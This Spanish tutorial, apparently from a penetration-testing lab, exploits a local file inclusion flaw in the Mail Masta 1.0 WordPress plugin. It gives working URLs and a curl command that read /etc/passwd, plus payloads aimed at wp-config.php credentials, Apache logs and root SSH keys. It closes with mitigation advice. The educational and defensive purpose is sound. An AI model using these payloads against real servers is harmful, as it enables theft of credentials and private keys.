
### **Explotación de Plugins Vulnerables en WordPress**

#### **Aprovechando los Resultados de WPScan**

WPScan identificó que el sitio **usa una versión desactualizada de WordPress (5.3.2)** y un **tema antiguo (Twenty Twenty)**. También detectó **dos plugins vulnerables**:

- **Mail Masta 1.0** (vulnerable a **SQL Injection y Local File Inclusion - LFI**).
- **Google Review Slider** (vulnerable a **SQL Injection Autenticado**).

Estos hallazgos incluyen enlaces a PoCs (Pruebas de Concepto) que indican cómo explotar estas vulnerabilidades.

---

## **Explotando una Vulnerabilidad LFI en Mail Masta 1.0**

**LFI (Local File Inclusion)** permite a un atacante **leer archivos del sistema** en el servidor, lo que puede exponer credenciales y datos sensibles.

### **Paso 1: Verificar si el LFI es Explotable**

Según **exploit-db**, la vulnerabilidad LFI en **Mail Masta 1.0** se explota accediendo a:

```plaintext
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Si el ataque es exitoso, se podrá leer el archivo **`/etc/passwd`**, que contiene información sobre los usuarios del sistema.

---

### **Paso 2: Explotación usando el Navegador**

Para probar la vulnerabilidad, simplemente ingresamos la URL en un navegador:

```plaintext
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Si el ataque es exitoso, el navegador mostrará contenido similar a esto:

```plaintext
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

---

### **Paso 3: Explotación con cURL**

Podemos verificar la vulnerabilidad desde la terminal usando `cURL`:

```bash
curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**Salida esperada (indica éxito en la explotación):**

```plaintext
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

---

## **Posibles Ataques Usando LFI**

1. **Leer archivos sensibles como:**
    - Credenciales de bases de datos (`wp-config.php`):
        
        ```plaintext
        http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../wp-config.php
        ```
        
    - Logs de acceso (`/var/log/apache2/access.log`):
        
        ```plaintext
        http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log
        ```
        
    - Claves SSH del servidor (`/root/.ssh/id_rsa`):
        
        ```plaintext
        http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/root/.ssh/id_rsa
        ```
        
2. **Ejecución Remota de Código (RCE) a través de Log Poisoning**
    - Si podemos escribir en un archivo de log accesible, podemos inyectar código PHP malicioso y ejecutarlo.

---

## **Recomendaciones para Mitigar LFI**

1. **Actualizar o eliminar el plugin vulnerable.**
2. **Restringir acceso directo a archivos en WordPress.**
3. **Configurar `open_basedir` en `php.ini` para evitar acceso a archivos sensibles.**
4. **Usar reglas en `.htaccess` para bloquear accesos no autorizados:**
    
    ```plaintext
    <Files count_of_send.php>
    Order Allow,Deny
    Deny from all
    </Files>
    ```
    
5. **Revisar los logs del servidor** para detectar intentos de explotación.

---

## **Conclusión**

A través de **WPScan**, identificamos una vulnerabilidad LFI en **Mail Masta 1.0** y la explotamos con **cURL**. Con LFI, un atacante podría:

- **Leer archivos del servidor.**
- **Obtener credenciales.**
- **Ejecutar código malicioso.**

Por ello, **mantener WordPress y sus plugins actualizados** es una medida esencial para evitar este tipo de ataques.